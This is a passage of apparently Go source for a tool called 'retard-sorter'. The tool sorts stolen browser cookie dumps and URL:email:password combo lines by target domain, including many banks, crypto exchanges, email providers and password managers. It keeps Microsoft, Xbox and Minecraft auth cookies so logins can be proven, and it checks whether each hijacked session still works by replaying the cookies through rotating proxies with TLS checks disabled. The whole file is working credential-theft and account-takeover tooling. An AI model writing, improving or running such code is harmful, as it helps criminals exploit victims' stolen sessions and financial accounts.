package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"embed"
	"encoding/json"
	"errors"
	"fmt"
	"html/template"
	"io"
	"io/fs"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"retard-sorter/internal/auth"
	"retard-sorter/internal/converter"
	"retard-sorter/internal/handlers"
	"retard-sorter/internal/supabase"
)

const MaxCookieFileSize = 256 * 1024 * 1024

const Version = "1.9.0"

//go:embed static/*
var staticFiles embed.FS

type Config struct {
	Filters   []string `json:"filters"`
	LastRun   string   `json:"last_run"`
	ProxyMode string   `json:"proxy_mode"`
	ProxyFile string   `json:"proxy_file"`
	SortMode  string   `json:"sort_mode"`
	// HitsOutputDir, when set, dumps sorted hits directly into this folder
	// (flat — no run_<date> folder, no summary.json). Empty = the default
	// results/run_<date>/hits behavior.
	HitsOutputDir string `json:"hits_output_dir"`
	Converter struct {
		InputFile    string `json:"input_file"`
		OutputDir    string `json:"output_dir"`
		Prefix       string `json:"prefix"`
		Concurrency  int    `json:"concurrency"`
		BrowserPath  string `json:"browser_path"`
	} `json:"converter,omitempty"`
}

type Cookie struct {
	Domain    string `json:"-"`
	RawDomain string `json:"-"`
	Flag      string `json:"-"`
	Path      string `json:"-"`
	Secure    string `json:"-"`
	Expiry    string `json:"-"`
	Name      string `json:"-"`
	Value     string `json:"-"`
}

type Summary struct {
	RunID           string         `json:"run_id"`
	Timestamp       string         `json:"timestamp"`
	FilesScanned    int            `json:"files_scanned"`
	TotalCookies    int            `json:"total_cookies"`
	TotalHits       int            `json:"total_hits"`
	CheckedCookies  int            `json:"checked_cookies"`
	ValidCookies    int            `json:"valid_cookies"`
	InvalidCookies  int            `json:"invalid_cookies"`
	Errors          int            `json:"errors"`
	UnparsedLines   int            `json:"unparsed_lines,omitempty"`
	ValidMicrosoft  int            `json:"valid_microsoft,omitempty"`
	ValidMinecraft  int            `json:"valid_minecraft,omitempty"`
	ElapsedSeconds  float64        `json:"elapsed_seconds"`
	FiltersUsed     []string       `json:"filters_used"`
	SourceDirectory string         `json:"source_directory"`
	DomainBreakdown map[string]int `json:"domain_breakdown"`
	OutputDir       string         `json:"output_dir"`
	ProfilesDir     string         `json:"profiles_dir"`
}

type RunEntry struct {
	RunID          string  `json:"run_id"`
	Timestamp      string  `json:"timestamp"`
	FilesScanned   int     `json:"files_scanned"`
	TotalCookies   int     `json:"total_cookies"`
	TotalHits      int     `json:"total_hits"`
	Errors         int     `json:"errors"`
	ElapsedSeconds float64 `json:"elapsed_seconds"`
}

type ProgressEvent struct {
	Type            string         `json:"type"`
	Processed       int            `json:"processed,omitempty"`
	Total           int            `json:"total,omitempty"`
	Hits            int            `json:"hits,omitempty"`
	Percent         float64        `json:"percent,omitempty"`
	RunID           string         `json:"run_id,omitempty"`
	FilesScanned    int            `json:"files_scanned,omitempty"`
	TotalCookies    int            `json:"total_cookies,omitempty"`
	TotalHits       int            `json:"total_hits,omitempty"`
	Errors          int            `json:"errors,omitempty"`
	ElapsedSeconds  float64        `json:"elapsed_seconds,omitempty"`
	OutputDir       string         `json:"output_dir,omitempty"`
	DomainBreakdown map[string]int `json:"domain_breakdown,omitempty"`
	Message         string         `json:"message,omitempty"`
	Checked         int            `json:"checked,omitempty"`
	CheckTotal      int            `json:"check_total,omitempty"`
	Valid           int            `json:"valid,omitempty"`
	Invalid         int            `json:"invalid,omitempty"`
	CheckStatus     string         `json:"check_status,omitempty"`
	MinecraftValid  int            `json:"minecraft_valid,omitempty"`
	Unparsed        int            `json:"unparsed,omitempty"`
}

type checkTask struct {
	domain  string
	cookies []Cookie
}

var (
	cfg                  *Config
	cfgMu                sync.RWMutex
	cfgPath              string
	resDir               string
	profilesDir          string
	assetsDir            string
	changelogPath        string
	uploadedProxiesPath  string
	converterInputPath   string
	proxies              []string
	proxiesMu            sync.Mutex
	proxiesPath          string
	logPath              string
	logMu                sync.Mutex

	convertMu     sync.Mutex
	convertCancel context.CancelFunc

	sharedTransport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    100,
		IdleConnTimeout: 30 * time.Second,
	}
)

func safeSSE(w http.ResponseWriter, flusher http.Flusher, ev ProgressEvent) {
	defer func() { recover() }()
	fmt.Fprintf(w, "data: %s\n\n", mustJSON(ev))
	if flusher != nil {
		flusher.Flush()
	}
}

func safeSSEWithContext(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, ev ProgressEvent) {
	select {
	case <-ctx.Done():
		return
	default:
	}
	safeSSE(w, flusher, ev)
}

func getExeDir() string {
	exe, err := os.Executable()
	if err != nil {
		d, _ := os.Getwd()
		return d
	}
	return filepath.Dir(exe)
}

func initPaths() {
	base := getExeDir()
	cfgPath = filepath.Join(base, "retard_config.json")
	resDir = filepath.Join(base, "results")
	assetsDir = filepath.Join(base, "assets")
	changelogPath = filepath.Join(base, "CHANGELOG.md")
	logPath = filepath.Join(base, "retard-sorter.log")
	proxiesPath = filepath.Join(base, "proxies.txt")
	uploadedProxiesPath = filepath.Join(base, "uploaded_proxies.txt")
	converterInputPath = filepath.Join(base, "converter_input.txt")

	home, _ := os.UserHomeDir()
	if home == "" {
		home = base
	}
	profilesDir = filepath.Join(home, "Documents", "profiles")

	os.MkdirAll(resDir, 0755)
	os.MkdirAll(assetsDir, 0755)
	os.MkdirAll(profilesDir, 0755)

	if _, err := os.Stat(logPath); os.IsNotExist(err) {
		f, ferr := os.Create(logPath)
		if ferr == nil {
			f.Close()
		}
	}

	if _, err := os.Stat(proxiesPath); os.IsNotExist(err) {
		defaultProxies := "# Retard Sorter - proxy list (one per line)\n" +
			"# Format: ip:port or ip:port:user:pass\n" +
			"# Example:\n" +
			"# 127.0.0.1:8080\n" +
			"# 1.2.3.4:1080:user:pass\n"
		os.WriteFile(proxiesPath, []byte(defaultProxies), 0644)
	}
}

func appLog(format string, args ...interface{}) {
	logMu.Lock()
	defer logMu.Unlock()
	msg := fmt.Sprintf(format, args...)
	line := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(line)
		f.Close()
	}
	// NOTE: nothing is echoed to the console — run details (per-check
	// activity, proxy filters, progress) go to the log file only.
}

// fatalLog writes to the log file AND the console: a startup failure must
// never be invisible to whoever launched the app.
func fatalLog(format string, args ...interface{}) {
	msg := fmt.Sprintf(format, args...)
	line := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), msg)
	logMu.Lock()
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		f.WriteString(line)
		f.Close()
	}
	logMu.Unlock()
	fmt.Fprint(os.Stderr, line)
}

func loadConfig() *Config {
	initPaths()
	data, err := os.ReadFile(cfgPath)
	if err == nil {
		var c Config
		if json.Unmarshal(data, &c) == nil {
			if c.Filters == nil {
				c.Filters = []string{}
			}
			if c.SortMode == "" {
				c.SortMode = "cookie"
			}
			return &c
		}
	}
	c := &Config{
		Filters:  make([]string, len(DefaultFilters)),
		SortMode: "cookie",
	}
	copy(c.Filters, DefaultFilters)
	saveConfig(c)
	return c
}

func saveConfig(c *Config) {
	data, _ := json.MarshalIndent(c, "", "  ")
	os.WriteFile(cfgPath, data, 0644)
}

// hitsOutputDirSetting returns the configured flat hits dump folder,
// trimmed of surrounding whitespace ("" = default results behavior).
func hitsOutputDirSetting() string {
	cfgMu.RLock()
	defer cfgMu.RUnlock()
	return strings.TrimSpace(cfg.HitsOutputDir)
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	return err == nil && !info.IsDir()
}

var DefaultFilters = []string{
	"login.live.com", "login.microsoftonline.com", "login.microsoft.com",
	"account.live.com", "outlook.live.com", "mail.google.com",
	"accounts.google.com", "facebook.com", "instagram.com", "twitter.com",
	"x.com", "tiktok.com", "reddit.com", "discord.com", "discordapp.com",
	"netflix.com", "spotify.com", "amazon.com", "paypal.com", "ebay.com",
	"shopify.com", "etsy.com", "walmart.com", "target.com", "bestbuy.com",
	"homedepot.com", "lowes.com", "costco.com", "kroger.com",
	"albertsons.com", "cvs.com", "walgreens.com", "bankofamerica.com",
	"wellsfargo.com", "chase.com", "capitalone.com", "americanexpress.com",
	"discover.com", "citibank.com", "usbank.com", "pnc.com", "tdbank.com",
	"santander.com", "hsbc.com", "barclays.com", "lloydsbank.com",
	"natwest.com", "rbs.co.uk", "halifax.co.uk", "nationwide.co.uk",
	"co-operativebank.co.uk", "tsb.co.uk", "virginmoney.com",
	"yorkshirebank.co.uk", "clydesdalebank.com", "alliedirishbanks.com",
	"boi.ie", "permanenttsb.ie", "kbc.ie", "ulsterbank.ie", "anz.com",
	"westpac.com.au", "commonwealthbank.com.au", "nab.com.au", "ing.com.au",
	"amp.com.au", "bendigobank.com.au", "adelaidebank.com.au",
	"bankwest.com.au", "stgeorge.com.au", "suncorp.com.au", "meaa.com.au",
	"ubo.com.au", "86400.com.au", "upt.com.au", "judo.bank", "tyro.com",
	"prospa.com", "moula.com", "capify.com", "ondeck.com.au",
	"cashstop.com.au", "nimble.com.au", "walnut.com.au", "savvy.com.au",
	"plenti.com.au", "rateSetter.com.au", "moneyplace.com.au",
	"firstmac.com.au", "resimac.com.au", "pepper.com.au", "liberty.com.au",
	"homestar.com.au", "loans.com.au", "aussie.com.au",
	"mortgagechoice.com.au", "homeloans.com.au",
	"statecustodians.com.au", "tmbank.com.au", "mybo.com.au",
	"ubank.com.au", "86 400.com.au", "xinja.com.au", "voltbank.com.au",
	"neobank.com.au", "wewill.gov.au", "webull.com", "robinhood.com",
	"coinbase.com", "binance.com", "kraken.com", "gemini.com",
	"crypto.com", "blockchain.com", "bitfinex.com", "bittrex.com",
	"poloniex.com", "hitbtc.com", "huobi.com", "okex.com", "bybit.com",
	"ftx.com", "kucoin.com", "gate.io", "mexc.com", "lbank.com",
	"zb.com", "coinex.com", "bitmart.com", "ascendex.com", "hotbit.io",
	"bitget.com", "bingx.com", "woo.network", "phemex.com", "deribit.com",
	"bitmex.com", "delta.exchange", "aax.com", "btse.com", "liquid.com",
	"quoinex.com", "coinflex.com", "bit.com", "digifinex.com",
	"latoken.com", "kuna.io", "whitebit.com", "coinmetro.com", "coss.io",
	"idex.io", "uniswap.org", "pancakeswap.finance", "sushiswap.com",
	"curve.fi", "balancer.fi", "yearn.finance", "compound.finance",
	"aave.com", "makerdao.com", "instadapp.io", "zapper.fi", "zerion.io",
	"debank.com", "opensea.io", "rarible.com", "superrare.com",
	"knownorigin.io", "mintable.app", "niftygateway.com",
	"foundation.app", "async.art", "makersplace.com", "veve.me",
	"godsunchained.com", "axieinfinity.com", "thesandboxgame.com",
	"decentraland.org", "sorare.com", "nba-topshot.com",
	"coinmarketcap.com", "coingecko.com", "tradingview.com",
	"investing.com", "bloomberg.com", "reuters.com", "cnbc.com",
	"wsj.com", "ft.com", "economist.com", "nytimes.com",
	"washingtonpost.com", "theguardian.com", "bbc.com", "bbc.co.uk",
	"msn.com", "yahoo.com", "aol.com", "protonmail.com", "proton.me",
	"tutanota.com", "gmx.com", "mail.com", "yandex.com", "zoho.com",
	"fastmail.com", "icloud.com", "me.com", "mac.com", "github.com",
	"gitlab.com", "bitbucket.org", "atlassian.com", "jira.com",
	"confluence.com", "slack.com", "teams.microsoft.com", "zoom.us",
	"webex.com", "gotomeeting.com", "teamviewer.com", "anydesk.com",
	"logmein.com", "vnc.com", "lastpass.com", "1password.com",
	"dashlane.com", "bitwarden.com", "keeper.com", "nordpass.com",
	"roboform.com", "enpass.io", "truekey.com", "mcafee.com",
	"norton.com", "avast.com", "avg.com", "bitdefender.com",
	"kaspersky.com", "malwarebytes.com", "eset.com", "trendmicro.com",
	"sophos.com", "panda.com", "comodo.com", "zonealarm.com",
	"checkpoint.com", "paloaltonetworks.com", "fortinet.com", "cisco.com",
	"juniper.com", "sonicwall.com", "watchguard.com", "barracuda.com",
	"proofpoint.com", "mimecast.com", "symantec.com", "broadcom.com",
	"vmware.com", "oracle.com", "sap.com", "salesforce.com",
	"servicenow.com", "workday.com", "adp.com", "paychex.com",
	"intuit.com", "quickbooks.com", "xero.com", "myob.com",
	"freshbooks.com", "waveapps.com", "hubspot.com", "mailchimp.com",
	"constantcontact.com", "activecampaign.com", "getresponse.com",
	"convertkit.com", "aweber.com", "infusionsoft.com", "ontraport.com",
	"keap.com", "drip.com", "sendinblue.com", "sendgrid.com",
	"twilio.com", "plivo.com", "nexmo.com", "messagebird.com",
	"sinch.com", "bandwidth.com", "flowroute.com", "telnyx.com",
	"voxbone.com", "inteliquent.com", "peering.com", "equinix.com",
	"digitalrealty.com", "cyrusone.com", "qtsdatacenters.com",
	"ironmountain.com", "atandt.com", "verizon.com", "tmobile.com",
	"sprint.com", "cingular.com",
}

func parseNetscapeCookieFile(path string) ([]Cookie, error) {
	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.Size() > MaxCookieFileSize {
		return nil, fmt.Errorf("file too large: %d bytes (max %d)", info.Size(), MaxCookieFileSize)
	}
	if info.Size() == 0 {
		return nil, nil
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	cookies := make([]Cookie, 0, 64)
	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 256*1024), 10*1024*1024)

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) >= 7 {
			cookies = append(cookies, Cookie{
				RawDomain: parts[0],
				Domain:    strings.TrimLeft(parts[0], "."),
				Flag:      parts[1],
				Path:      parts[2],
				Secure:    parts[3],
				Expiry:    parts[4],
				Name:      parts[5],
				Value:     strings.Join(parts[6:], "\t"),
			})
		}
	}
	if err := scanner.Err(); err != nil {
		return cookies, fmt.Errorf("scan error: %w", err)
	}
	return cookies, nil
}

// filterIndex provides O(1) exact-match lookups and fast suffix fallback.
type filterIndex struct {
	exact   map[string]string // lowercase -> original
	suffixes []string         // pre-computed lowercase for suffix matching
}

// preservedAuthSuffixes are domains whose cookies must be kept in every
// sorted file even when they don't match the configured filters. Without
// them the Microsoft checker cannot prove the login (OAuth/oauth2 + Xbox +
// Minecraft all need these cookies), so sorted runs were ~10x less accurate
// than unsorted ones.
var preservedAuthSuffixes = []string{
	"live.com",            // login.live.com, account.live.com
	"microsoftonline.com", // login.microsoftonline.com, account.microsoftonline.com
	"microsoft.com",       // login.microsoft.com, account.microsoft.com
	"msn.com",             // login.msn.com variant
	"xboxlive.com",        // user.auth.xboxlive.com, xsts.auth.xboxlive.com
	"minecraftservices.com", // api.minecraftservices.com
	"xbox.com",
}

// isPreservedAuthCookie reports whether the cookie must survive sorting.
func isPreservedAuthCookie(c Cookie) bool {
	cd := strings.ToLower(strings.TrimLeft(c.Domain, "."))
	if cd == "" {
		return false
	}
	for _, s := range preservedAuthSuffixes {
		if cd == s || strings.HasSuffix(cd, "."+s) {
			return true
		}
	}
	return false
}

// buildFilterIndex precomputes the lookup table used for matching.
func buildFilterIndex(filters []string) *filterIndex {
	fi := &filterIndex{
		exact:    make(map[string]string, len(filters)),
		suffixes: make([]string, 0, len(filters)),
	}
	for _, f := range filters {
		low := strings.ToLower(f)
		fi.exact[low] = f
		fi.suffixes = append(fi.suffixes, low)
	}
	return fi
}

func (fi *filterIndex) match(c Cookie) string {
	cd := strings.ToLower(c.Domain)
	// O(1) exact match
	if orig, ok := fi.exact[cd]; ok {
		return orig
	}
	// Suffix match
	for _, tdl := range fi.suffixes {
		if strings.HasSuffix(cd, "."+tdl) {
			return fi.exact[tdl]
		}
	}
	// Also check raw domain
	raw := strings.ToLower(strings.TrimLeft(c.RawDomain, "."))
	if raw != cd {
		if orig, ok := fi.exact[raw]; ok {
			return orig
		}
		for _, tdl := range fi.suffixes {
			if strings.HasSuffix(raw, "."+tdl) {
				return fi.exact[tdl]
			}
		}
	}
	return ""
}

// matchDomain is like match, but takes a bare hostname (used by ULP sorting).
// Falls back to a "www."-stripped variant of the host for matching.
func (fi *filterIndex) matchDomain(host string) string {
	cd := strings.ToLower(strings.TrimSpace(host))
	if cd == "" {
		return ""
	}
	if orig, ok := fi.exact[cd]; ok {
		return orig
	}
	for _, tdl := range fi.suffixes {
		if strings.HasSuffix(cd, "."+tdl) {
			return fi.exact[tdl]
		}
	}
	cd2 := strings.TrimPrefix(cd, "www.")
	if cd2 != cd && cd2 != "" {
		if orig, ok := fi.exact[cd2]; ok {
			return orig
		}
		for _, tdl := range fi.suffixes {
			if strings.HasSuffix(cd2, "."+tdl) {
				return fi.exact[tdl]
			}
		}
	}
	return ""
}

// === ULP (URL : Email : Pass) ===

var ulpSepRe = regexp.MustCompile(`\s+[:|,]\s+|\t+`)

// parseULPLine parses a single "URL : Email : Pass" line (e.g.
// "https://www.shamela.ws : SWoolley@ncrangola.com : 3m2kFMEu7V6s").
// Also accepts "|" / tab separators, the no-space "url:email:pass" variant,
// and URL-last lines like "email:pass|https://url".
func parseULPLine(line string) (urlStr, email, pass string, ok bool) {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, "//") {
		return "", "", "", false
	}
	norm := ulpSepRe.ReplaceAllString(line, "|")
	parts := strings.Split(norm, "|")
	for i := range parts {
		parts[i] = strings.TrimSpace(parts[i])
	}
	if len(parts) == 1 {
		// No-space variant: "https://host.com:email:pass", "host.com:email:pass",
		// or "email:pass:https://host.com"
		sub := strings.Split(parts[0], ":")
		ei := -1
		for j, s := range sub {
			if strings.Contains(s, "@") {
				ei = j
				break
			}
		}
		if ei < 0 {
			return "", "", "", false
		}
		email = strings.Trim(sub[ei], "\"'")
		if !strings.Contains(email, "@") {
			return "", "", "", false
		}
		rest := sub[ei+1:]
		urlStr = strings.Trim(strings.Join(sub[:ei], ":"), "\"' ")
		if urlStr == "" {
			for j := len(rest) - 1; j >= 0; j-- {
				t := strings.TrimSpace(rest[j])
				if looksLikeURLToken(t) {
					urlStr = t
					for k := j - 1; k >= 0; k-- {
						st := strings.ToLower(strings.TrimSpace(rest[k]))
						if st == "http" || st == "https" {
							urlStr = st + ":" + urlStr
							j = k
						} else {
							break
						}
					}
					rest = rest[:j]
					break
				}
			}
		}
		pass = strings.Trim(strings.Join(rest, ":"), "\"' ")
		if urlStr == "" || pass == "" {
			return "", "", "", false
		}
		return urlStr, email, pass, true
	}
	emailIdx := -1
	for i, p := range parts {
		if p != "" && strings.Contains(p, "@") {
			emailIdx = i
			break
		}
	}
	if emailIdx < 0 {
		return "", "", "", false
	}
	email = parts[emailIdx]
	var extraPass string
	if idx := strings.Index(email, ":"); idx >= 0 {
		extraPass = email[idx+1:]
		email = strings.TrimSpace(email[:idx])
	}
	email = strings.Trim(email, "\"'")
	if email == "" || !strings.Contains(email, "@") {
		return "", "", "", false
	}
	passParts := parts[emailIdx+1:]
	if extraPass != "" {
		passParts = append([]string{extraPass}, passParts...)
	}
	urlStr = strings.Trim(strings.Join(parts[:emailIdx], ":"), "\"' ")
	if urlStr == "" && len(passParts) > 1 {
		// URL-last variant: "email:pass|https://url"
		last := strings.TrimSpace(passParts[len(passParts)-1])
		if looksLikeURLToken(last) {
			urlStr = strings.Trim(last, "\"' ")
			passParts = passParts[:len(passParts)-1]
		}
	}
	if len(passParts) == 0 {
		return "", "", "", false
	}
	pass = strings.Trim(strings.Join(passParts, ":"), "\"' ")
	if pass == "" || urlStr == "" {
		return "", "", "", false
	}
	return urlStr, email, pass, true
}

// looksLikeURLToken reports whether a token looks like a URL or bare hostname.
func looksLikeURLToken(tok string) bool {
	t := strings.TrimSpace(tok)
	if t == "" || strings.Contains(t, "@") || strings.ContainsAny(t, " \t") {
		return false
	}
	if strings.Contains(t, "://") {
		return true
	}
	return strings.Contains(t, ".")
}

// hostFromULP extracts the lowercase hostname from a URL string.
func hostFromULP(rawURL string) string {
	s := strings.TrimSpace(rawURL)
	if i := strings.Index(s, "://"); i >= 0 {
		rest := s[i+3:]
		if j := strings.IndexAny(rest, "/?#"); j >= 0 {
			rest = rest[:j]
		}
		s = rest
	} else {
		s = strings.TrimPrefix(s, "//")
		if i := strings.IndexAny(s, "/?#"); i >= 0 {
			s = s[:i]
		}
	}
	if i := strings.Index(s, ":"); i >= 0 {
		s = s[:i]
	}
	return strings.ToLower(s)
}

// === PROXY ===

func loadProxies(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	proxiesMu.Lock()
	proxies = nil
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		proxies = append(proxies, line)
	}
	proxiesMu.Unlock()
	return nil
}

func buildProxyURL(raw, mode string) string {
	parts := strings.Split(raw, ":")
	if len(parts) < 2 {
		return ""
	}
	ip, port := parts[0], parts[1]
	switch {
	case len(parts) >= 4:
		user, pass := parts[2], parts[3]
		return fmt.Sprintf("%s://%s:%s@%s:%s", mode, user, pass, ip, port)
	case strings.Contains(mode, "socks"):
		return fmt.Sprintf("socks5://%s:%s", ip, port)
	default:
		return fmt.Sprintf("http://%s:%s", ip, port)
	}
}

func checkDomainCookies(ctx context.Context, domain string, cookies []Cookie, proxyURL string) bool {
	if domain == "" {
		return false
	}
	u := "https://" + domain + "/"
	req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	for _, c := range cookies {
		if c.Name == "" {
			continue
		}
		req.AddCookie(&http.Cookie{
			Name:   c.Name,
			Value:  c.Value,
			Domain: c.Domain,
			Path:   c.Path,
		})
	}

	tr := sharedTransport
	if proxyURL != "" {
		p, e := url.Parse(proxyURL)
		if e != nil {
			return false
		}
		perReqTr := &http.Transport{
			Proxy:                 http.ProxyURL(p),
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:          10,
			MaxIdleConnsPerHost:   2,
			IdleConnTimeout:       30 * time.Second,
			ResponseHeaderTimeout: 10 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		}
		defer perReqTr.CloseIdleConnections()
		tr = perReqTr
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()
	return resp.StatusCode == 200
}

// === HTTP HANDLERS ===

func handleChangelog(w http.ResponseWriter, r *http.Request) {
	data, err := os.ReadFile(changelogPath)
	if err != nil {
		http.Error(w, "changelog not found", 404)
		return
	}
	writeJSON(w, map[string]string{"content": string(data)})
}

func handleConfig(w http.ResponseWriter, r *http.Request) {
	cfgMu.RLock()
	c := *cfg
	cfgMu.RUnlock()
	writeJSON(w, c)
}

func handleUpdateFilters(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Filters []string `json:"filters"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}
	cfgMu.Lock()
	cfg.Filters = req.Filters
	sort.Strings(cfg.Filters)
	saveConfig(cfg)
	cfgMu.Unlock()
	writeJSON(w, map[string]string{"status": "ok"})
}

func handleRuns(w http.ResponseWriter, r *http.Request) {
	os.MkdirAll(resDir, 0755)
	entries, err := os.ReadDir(resDir)
	if err != nil {
		writeJSON(w, []RunEntry{})
		return
	}
	var runs []RunEntry
	for _, e := range entries {
		if !e.IsDir() || !strings.HasPrefix(e.Name(), "run_") {
			continue
		}
		sumPath := filepath.Join(resDir, e.Name(), "summary.json")
		data, err := os.ReadFile(sumPath)
		if err != nil {
			continue
		}
		var s Summary
		if json.Unmarshal(data, &s) != nil {
			continue
		}
		runs = append(runs, RunEntry{
			RunID:          s.RunID,
			Timestamp:      s.Timestamp,
			FilesScanned:   s.FilesScanned,
			TotalCookies:   s.TotalCookies,
			TotalHits:      s.TotalHits,
			Errors:         s.Errors,
			ElapsedSeconds: s.ElapsedSeconds,
		})
	}

	profilesEntries, err := os.ReadDir(profilesDir)
	if err == nil {
		for _, e := range profilesEntries {
			if !e.IsDir() || !strings.HasPrefix(e.Name(), "run_") {
				continue
			}
			sumPath := filepath.Join(profilesDir, e.Name(), "summary.json")
			data, err := os.ReadFile(sumPath)
			if err != nil {
				continue
			}
			var s Summary
			if json.Unmarshal(data, &s) != nil {
				continue
			}
			runs = append(runs, RunEntry{
				RunID:          s.RunID,
				Timestamp:      s.Timestamp,
				FilesScanned:   s.FilesScanned,
				TotalCookies:   s.TotalCookies,
				TotalHits:      s.TotalHits,
				Errors:         s.Errors,
				ElapsedSeconds: s.ElapsedSeconds,
			})
		}
	}

	sort.Slice(runs, func(i, j int) bool {
		return runs[i].RunID > runs[j].RunID
	})
	writeJSON(w, runs)
}

func handleRunDetail(w http.ResponseWriter, r *http.Request, runID string) {
	paths := []string{filepath.Join(resDir, "run_"+runID, "summary.json"), filepath.Join(profilesDir, "run_"+runID, "summary.json")}
	for _, sumPath := range paths {
		data, err := os.ReadFile(sumPath)
		if err != nil {
			continue
		}
		var s Summary
		if json.Unmarshal(data, &s) != nil {
			continue
		}
		writeJSON(w, s)
		return
	}
	http.Error(w, "not found", 404)
}

func processFileLoop(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, filters []string, dir, hitsDir, timestamp, proxyMode, proxyFile string) (Summary, bool) {
	now := time.Now()
	fi := buildFilterIndex(filters)
	useProxy := proxyMode == "http" || proxyMode == "socks4" || proxyMode == "socks5"

	var files []string
	filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		files = append(files, path)
		return nil
	})
	sort.Strings(files)

	totalFiles := len(files)
	if totalFiles == 0 {
		return Summary{}, false
	}

	var totalCookies int64
	var totalHits int64
	var errorCount int64
	var domainHitsMu sync.Mutex
	domainHits := make(map[string]int)
	startTime := time.Now()

	type fileHitsInfo struct {
		relPath string
		domains map[string][]Cookie
	}
	var allFileHitsMu sync.Mutex
	var allFileHits []fileHitsInfo

	// Track parent dirs for deferred cleanup
	var dirsToCleanMu sync.Mutex
	dirsToClean := make(map[string]struct{})

	writeHitsFile := func(relPath string, fileHits []Cookie, idx int) bool {
		if len(fileHits) == 0 {
			return true
		}
		flatName := strings.ReplaceAll(relPath, " ", "_")
		flatName = strings.ReplaceAll(flatName, "/", "_")
		flatName = strings.ReplaceAll(flatName, "\\", "_")
		if flatName == "." || flatName == "" {
			flatName = fmt.Sprintf("file_%d", idx)
		}
		outPath := filepath.Join(hitsDir, "retard_"+flatName)
		var sb strings.Builder
		sb.Grow(len(fileHits) * 128)
		sb.WriteString("# Netscape HTTP Cookie File\n")
		sb.WriteString(fmt.Sprintf("# Source: %s\n", relPath))
		sb.WriteString(fmt.Sprintf("# Matched domains: %d cookies\n", len(fileHits)))
		sb.WriteString(fmt.Sprintf("# Exported at: %s\n\n", now.Format(time.RFC3339)))
		for _, c := range fileHits {
			sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%s\t%s\t%s\n",
				c.RawDomain, c.Flag, c.Path, c.Secure, c.Expiry, c.Name, c.Value))
		}
		if err := os.WriteFile(outPath, []byte(sb.String()), 0644); err != nil {
			appLog("WARN - failed to write hits file %s: %v", outPath, err)
			return false
		}
		return true
	}

	processOne := func(idx int, filePath string) (fileErr error) {
		defer func() {
			if rec := recover(); rec != nil {
				appLog("PANIC processing file %s: %v", filePath, rec)
				fileErr = fmt.Errorf("panic: %v", rec)
			}
		}()

		relPath, _ := filepath.Rel(dir, filePath)
		cookies, err := parseNetscapeCookieFile(filePath)
		if err != nil {
			return err
		}
		if len(cookies) == 0 {
			os.Remove(filePath)
			return nil
		}
		atomic.AddInt64(&totalCookies, int64(len(cookies)))

		var fileHits []Cookie
		var domains map[string][]Cookie
		if useProxy {
			domains = make(map[string][]Cookie)
		}
		for _, c := range cookies {
			matchedDomain := fi.match(c)
			if matchedDomain != "" {
				fileHits = append(fileHits, c)
				if useProxy {
					domains[matchedDomain] = append(domains[matchedDomain], c)
				}
				domainHitsMu.Lock()
				domainHits[matchedDomain]++
				domainHitsMu.Unlock()
				atomic.AddInt64(&totalHits, 1)
			} else if isPreservedAuthCookie(c) {
				// Skip-keep: not a target-domain hit, but the Microsoft auth
				// sessions needed so the checker can still validate the file.
				fileHits = append(fileHits, c)
			}
		}

		if len(fileHits) > 0 {
			writeHitsFile(relPath, fileHits, idx)
			if useProxy {
				allFileHitsMu.Lock()
				allFileHits = append(allFileHits, fileHitsInfo{relPath, domains})
				allFileHitsMu.Unlock()
			}
		}

		// Track parent dir for deferred cleanup
		parent := filepath.Dir(filePath)
		if parent != dir && parent != "." && parent != "/" {
			dirsToCleanMu.Lock()
			dirsToClean[parent] = struct{}{}
			dirsToCleanMu.Unlock()
		}
		return nil
	}

	// Parallel file processing
	const numWorkers = 16
	fileCh := make(chan int, numWorkers*4)
	var wg sync.WaitGroup
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
